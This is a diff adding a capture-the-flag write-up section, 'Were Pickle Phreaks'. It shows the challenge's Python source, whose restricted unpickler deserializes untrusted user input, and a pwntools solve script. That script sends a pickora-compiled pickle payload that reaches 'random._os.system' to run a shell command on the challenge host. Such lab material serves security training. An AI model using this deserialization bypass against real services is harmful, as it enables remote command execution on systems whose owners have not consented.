@@ -1913,3 +1913,139 @@ def main() -> None:
 if __name__ == "__main__":
     main()
 ```
+
+### 7. Were Pickle Phreaks
+
+
+---
+
+**_SOURCE:_**
+
+```py
+from sandbox import unpickle, pickle
+import random
+
+members = []
+
+class Phreaks:
+    def __init__(self, hacker_handle, category, id):
+        self.hacker_handle = hacker_handle
+        self.category = category
+        self.id = id
+
+    def display_info(self):
+        print('================ ==============')
+        print(f'Hacker Handle    {self.hacker_handle}')
+        print('================ ==============')
+        print(f'Category         {self.category}')
+        print(f'Id               {self.id}')
+        print()
+
+def menu():
+    print('Phreaks member registration')
+    print('1. View current members')
+    print('2. Register new member')
+    print('3. Exit')
+
+def add_existing_members():
+    members.append(pickle(Phreaks('Skrill', 'Rev', random.randint(1, 10000))))
+    members.append(pickle(Phreaks('Alfredy', 'Hardware', random.randint(1, 10000))))
+    members.append(pickle(Phreaks('Suspicious', 'Pwn', random.randint(1, 10000))))
+    members.append(pickle(Phreaks('Queso', 'Web', random.randint(1, 10000))))
+    members.append(pickle(Phreaks('Stackos', 'Blockchain', random.randint(1, 10000))))
+    members.append(pickle(Phreaks('Lin', 'Web', random.randint(1, 10000))))
+    members.append(pickle(Phreaks('Almost Blood', 'JIT', random.randint(1, 10000))))
+    members.append(pickle(Phreaks('Fiasco', 'Web', random.randint(1, 10000))))
+    members.append(pickle(Phreaks('Big Mac', 'Web', random.randint(1, 10000))))
+    members.append(pickle(Phreaks('Freda', 'Forensics', random.randint(1, 10000))))
+    members.append(pickle(Phreaks('Karamuse', 'ML', random.randint(1, 10000))))
+
+def view_members():
+    for member in members:
+        try:
+            member = unpickle(member)
+            member.display_info()
+        except:
+            print('Invalid Phreaks member')
+
+def register_member():
+    pickle_data = input('Enter new member data: ')
+    members.append(pickle_data)
+
+def main():
+    add_existing_members()
+    while True:
+        menu()
+        try:
+            option = int(input('> '))
+        except ValueError:
+            print('Invalid input')
+            print()
+            continue
+        if option == 1:
+            view_members()
+        elif option == 2:
+            register_member()
+        elif option == 3:
+            print('Exiting...')
+            exit()
+        else:
+            print('No such option')  
+        print()
+
+if __name__ == '__main__':
+    main()
+```
+
+```python
+from base64 import b64decode, b64encode 
+from io import BytesIO
+import pickle as _pickle
+
+ALLOWED_PICKLE_MODULES = ['__main__', 'app']
+UNSAFE_NAMES = ['__builtins__']
+
+class RestrictedUnpickler(_pickle.Unpickler):
+    def find_class(self, module, name):
+        print(module, name)
+        if (module in ALLOWED_PICKLE_MODULES and not any(name.startswith(f"{name_}.") for name_ in UNSAFE_NAMES)):
+            return super().find_class(module, name)
+        raise _pickle.UnpicklingError()
+    
+def unpickle(data):
+    return RestrictedUnpickler(BytesIO(b64decode(data))).load()
+    
+def pickle(obj):
+    return b64encode(_pickle.dumps(obj))
+```
+---
+
+
+
+```py
+from base64 import b64encode
+from pickora import Compiler
+from pwn import *
+
+# nc 83.136.253.251 36803
+
+def main() -> None:
+    
+    s = connect("83.136.253.251", 36803)
+
+    print(s.recvuntil(b"> ").decode())
+    s.sendline(b"2")
+    print(s.recvuntil(b": ").decode())
+
+    tmp = "GLOBAL('app', 'random._os.system')('cat flag.txt')"
+    payload = Compiler().compile(tmp)
+    payload = b64encode(payload).decode()
+    s.sendline(payload)
+    print(s.recvuntil(b"> ").decode())
+    s.sendline(b"1")
+    print(s.recv().decode())
+    print(s.recv().decode())
+    
+if __name__ == "__main__":
+    main()
+```
